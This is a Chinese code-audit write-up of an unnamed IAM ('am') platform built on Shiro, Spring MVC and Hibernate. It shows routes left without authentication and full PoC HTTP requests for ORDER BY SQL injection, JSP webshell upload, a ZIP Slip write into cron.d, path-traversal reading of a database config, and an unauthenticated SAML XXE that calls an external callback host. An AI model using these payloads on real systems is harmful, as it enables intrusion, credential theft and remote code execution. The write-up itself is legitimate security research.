# 某盾am平台代码审计
> 来源：https://xz.aliyun.com/news/92494

# 前言

  
  
  
网上披露的框架本身的漏洞就不说了，主要审计业务代码问题  
  
  
  
鹰图：  
  

![image.png](https://i.im.ge/QMV4EBc/p2m-d329f5d453.png)

  
  

# 项目分析

  
项目解压WAR部署的，看了下web.xml，配了4个DispatcherServlet分别处理`/controller/*`、`/rest/*`、`/api/*`、`/webauth/*`，鉴权用的Shiro，配在Spring的XML里  
  

![image.png](https://imglink.cc/cdn/H_4f08OJrB.png)

  
  
架构比较简单，shiro+spirngMvc+Hibernate，不涉及jsp，然后有一些servlet，主要审计Controller层和自定义的servlet，一共反编译了1572个class文件  
  

# 鉴权分析

  
项目用Shiro做鉴权，那么分析的点：  
  
1鉴权绕过  
  
aShiro版本漏洞能不能打  
  
b有没有自定义filter覆盖默认逻辑  
  
2白名单路由提取  
  

![image.png](https://imglink.cc/cdn/wdUBXkqiom.png)

  
  
看了下，这套系统Shiro配置没用到anon，也没自定义filter，全是authc+roles默认filter，版本看jar包也不是低版本有漏洞的，所以Shiro绕过这条路走不通  
  
那就得看哪些路由没配Shiro规则，或者只走了别的filter没走Shiro  
  

![image.png](https://i.im.ge/QMV4Ah0/p2m-3d7b3c1f4b.png)

  
  
整理下adminShiroFilter的路由覆盖情况：  
  

| 前缀 | Shiro规则 | 保护情况 |
| --- | --- | --- |
| /controller/operator/** | authc, roles[systemViewer] | 有 |
| /controller/system/** | authc, roles[systemViewer] | 有 |
| /controller/tenant/** | authc, roles[tenantViewer] | 有 |
| /controller/user/** | authc | 有 |
| /operator/** | authc, roles[systemViewer] | 有 |
| /tenant/** | authc, roles[tenantViewer] | 有 |
| /user/** | authc | 有 |
| /controller/admin/** | 无规则 | 没配 |
| /controller/portal/** | 无规则 | 没配 |
| /controller/unprotected/** | 无规则 | 没配 |

  
然后selfHelpShiroFilter只有/user/selfHelp/和/controller/user/selfHelp/两条  
  
所以`/controller/admin/**`和`/controller/portal/**`和`/controller/unprotected/**`都没走Shiro，其中`/controller/admin/getPasswordRequirement`这些接口就暴露了  
  
另外`/controller/portal/*`走了portalContextFilter做上下文校验，不是完全匿名，但是`/controller/unprotected/portal/external/login`能创建外部用户，风险还是比较大  
  

# 漏洞审计

  

## SQL注入

  
还是按照我的习惯，先判断是不是Mybatis，看了下依赖没有Mybatis，项目用的Hibernate，那么搜索where或者append找拼接  
  

![image.png](https://i.im.ge/QMV4CbT/p2m-3b72bbc410.png)

  
  
大部分查了下都是预编译的，那么按照思路去找无法常规预编译的点，最终筛选到了一处疑似ORDER BY的拼接  
  
HibernateUserMonthlyRecordRepository.java的orderByUtils方法  
  

![image.png](https://i.im.ge/QMV4g1a/p2m-73612f86a3.png)

  
  
接收orderBy和order参数，然后拼接orderBy，查找方法调用  
  

![image.png](https://imglink.cc/cdn/inIauIBz0m.png)

  
  
5 处调用，挑一处跟下  
  
HibernateUserMonthlyRecordRepository的list方法  
  

![image.png](https://i.im.ge/QMV4YyG/p2m-8e81d3cc0d.png)

  
  
跟调用到UserPortalStatisticService.java的getMonthlyUserRecords方法  
  

![image.png](https://i.im.ge/QMV43aL/p2m-5b25dc9e0e.png)

  
  
最后跟到controller，aaaaController.java的getMonthlyUserRecord方法  
  

![image.png](https://i.im.ge/QMV4bHx/p2m-f2e6c948a1.png)

  
  
参数可控，存在注入  
  
poc:  
  
```
GET /aaa/bbb/ccc/ddd/monthly?month=1719763200000&orderBy=updatexml(1,concat(1,user()),1)&startRow=0&maxResults=10
Host:
X-Requested-With: XMLHttpRequest
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: same-origin
Referer: http://127.0.0.1:8080/am/login/login.html
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: empty
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Cookie: DKEYJSESSIONID=07200A4888E2A14800655EDC22A0700F; languageValue=zh; DKEYJSESSIONID=49A4766DD0A2531186DDD404207BFA96
```

![](https://i.im.ge/QMV4Khz/p2m-5961d6febd.png)

  
  
后续分析其余几个调用都能跟踪到controller，且数据流通可注入  
  

## 文件上传

  
这套系统的上传接口挺多的，十几个，分了两种情况  
  
第一种：无任何后缀校验（大概10处，高危）  
  

![image.png](https://i.im.ge/QMV4ZXS/p2m-74a265295b.png)

  
  
这里跟一处演示下  
  
SelfxxxxConfigsService.java的uploadFile  
  

![image.png](https://imglink.cc/cdn/az_Kw-smht.png)

  
  
保存的文件通过FilenameUtils.concat((String)parent, (String)name)方法凭据，都是方法调用传参，跟进调用  
  

![image.png](https://i.im.ge/QMV48mJ/p2m-90df7125cc.png)

  
  

![image.png](https://i.im.ge/QMV4RZy/p2m-b6b6386f38.png)

  
  
跟到controller  
  

![image.png](https://i.im.ge/QMV4Vb6/p2m-2a7b82ae3f.png)

  
  
fileName是上传文件的原始文件名，过程中无后缀限制存在任意文件上传  
  
```
POST /am/aaa/bbb/ccc/file/upload HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: empty
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Cookie: DKEYJSESSIONID=07200A4888E2A14800655EDC22A0700F; languageValue=zh; DKEYJSESSIONID=49A4766DD0A2531186DDD404207BFA96
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="type"

logoImg
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% 123
%>
------WebKitFormBoundary--
```

![image.png](https://i.im.ge/QMV4zaK/p2m-e939826e66.png)

  
  
  
  
第二种：限制了文件后缀（2处）  
  
TimexxxxController的upload/tokens只判断了.xml  
  

```
if (!originalFilename.endsWith(".xml") && !originalFilename.endsWith(".XML")) {
    return ResponseData.error(...);
}
```

## ZIP解压RCE

  
这个其实可以算是文件上传的第三种类型，系统有几处ZIP解压操作，全都有ZIP Slip问题  
  
MainxxxxUpdateService.unZip() — 最严重的，啥校验都没有  
  

```
private static void unZip(File src, File des) throws IOException {
    ZipFile zipFile = new ZipFile(src);
    Enumeration files = zipFile.getEntries();
    while (files.hasMoreElements()) {
        ZipArchiveEntry entry = (ZipArchiveEntry)files.nextElement();
        String zipName = entry.getName();
        File zipEntryFile = new File(des, zipName);  // 用户可控，无校验
        FileOutputStream fos = new FileOutputStream(zipEntryFile);
        IOUtils.copy(is, fos);
    }
}
```

![image.png](https://i.im.ge/QMV4fGF/p2m-a938a03087.png)

  
  
`entry.getName()`直接取出来new File，ZIP里写`../../etc/cron.d/evil`就能穿出去。可上传恶意ZIP直接RCE  
  
还有两处在PackagexxxxTemplateManager和PackaxxxxtalPageService  
  

![image.png](https://imglink.cc/cdn/SKEpDsDqNe.png)

  
  
虽然检查了ZIP里有没有.jsp，有就抛异常，但是这里可以目录穿越覆盖计划任务等高危文件  
  
测试构造一个恶意的zip  
  

![image.png](https://imglink.cc/cdn/GAE_2D68_S.png)

  
  
上传测试  
  
poc:  
  

```
POST /am/xxx/aaa/replaceWithZipBundle HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: empty
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Cookie: DKEYJSESSIONID=07200A4888E2A14800655EDC22A0700F; languageValue=zh; DKEYJSESSIONID=49A4766DD0A2531186DDD404207BFA96
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="realmId"

00000000-0000-0000-0000-000000000010
------WebKitFormBoundary
Content-Disposition: form-data; name="type"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="platform"

1
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="evil.zip"
Content-Type: application/zip

{{file(evil_poc_final.zip)}}
 ------WebKitFormBoundary--
```

![image.png](https://i.im.ge/QMV4nwh/p2m-2bc2a2f4a1.png)

  
  
访问  
  

![image.png](https://i.im.ge/QMV4J18/p2m-549a2686f7.png)

  
  

## 文件读取（路径遍历）

  
PackagexxxxxPageService.java的getFile方法会获取文件路径  
  
  
  

![image.png](https://i.im.ge/QMV4ppX/p2m-58bff3e006.png)

  
  
定位方法调用  
  

![image.png](https://imglink.cc/cdn/Tv-lu9EPhM.png)

  
  
其中PackagexxxxxPageService.java的getFileText方法使用了FileUtils.readFileToString读取文件内容，跟进方法调用  
  

![image.png](https://i.im.ge/QMV4HA9/p2m-4e820170e6.png)

  
  
path完全可控，读取的内容输出到ResponseData  
  
poc:  
  

```
GET /am/aaa/vvv/ccc/file/text?realmId=00000000-0000-0000-0000-000000000010&type=1&platform=1&path=../../../../../../local/db.conf HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
Sec-Fetch-Mode: cors
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Site: same-origin
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: empty
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Cookie: DKEYJSESSIONID=07200A4888E2A14800655EDC22A0700F; languageValue=zh; DKEYJSESSIONID=49A4766DD0A2531186DDD404207BFA96
```

![](https://i.im.ge/QMVBQGC/p2m-6dcafbe31b.png)

  
  

## XXE

  
审计关键词：DocumentBuilderFactory.newInstance()  
  

![image.png](https://i.im.ge/QMV4GXY/p2m-1df76c32ac.png)

  
  

```
private XMLObject getXMLObject(String xmlString) ... {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    factory.setNamespaceAware(true);
    // 没配XXE防护：
    //   disallow-doctype-decl = true
    //   external-general-entities = false
    //   external-parameter-entities = false
    Document document = factory.newDocumentBuilder().parse(stream);
}
```

跟进调用  
  

![image.png](https://i.im.ge/QMV4eiD/p2m-105d7acbc0.png)

  
  
而且这个接口`/aaaa/bbbbb/saml2/acs`是没鉴权的，不在Shiro规则里  
  
关键的触发链路是XML解析在SAML签名验证前面，就算签名不对，XXE也已经触发了：  
  

```
POST /aaaa/bbbbb/saml2/acs
SAMLResponse=base64(xxe_payload)
  → 解码 → getXMLObject() → DocumentBuilder.parse() → XXE触发
  → 然后才签名验证（已经晚了）
```

POC：  
  

```
POST /am/aaa/vvv/saml2/acs HTTP/1.1
Host:
sec-ch-ua-mobile: ?0
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Fetch-Mode: navigate
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: none
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Upgrade-Insecure-Requests: 1
Sec-Fetch-User: ?1
Cookie: DKEYJSESSIONID=07200A4888E2A14800655EDC22A0700F; languageValue=zh; DKEYJSESSIONID=49A4766DD0A2531186DDD404207BFA96
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KICA8IURPQ1RZUEUgZm9vIFsKICAgIDwhRU5USVRZIHh4ZSBTWVNURU0gImh0dHA6Ly93cmU5MGo3ai5yZXF1ZXN0cmVwby5jb20veHhlIj4KICBdPgogIDxzYW1scDpSZXNwb25zZSB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiBJRD0idGVzdCIgVmVyc2lvbj0iMi4wIgogIElzc3VlSW5zdGFudD0iMjAyNC0wMS0wMVQwMDowMDowMFoiPgogICAgPHNhbWw6SXNzdWVyIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPiZ4eGU7PC9zYW1sOklzc3Vlcj4KICAgIDxzYW1scDpTdGF0dXM+CiAgICAgIDxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz4KICAgIDwvc2FtbHA6U3RhdHVzPgogIDwvc2FtbHA6UmVzcG9uc2U+
```

![image.png](https://i.im.ge/QMVBMb4/p2m-16ed15c3af.png)

  
  

![image.png](https://i.im.ge/QMV44KM/p2m-f40dc19b36.png)
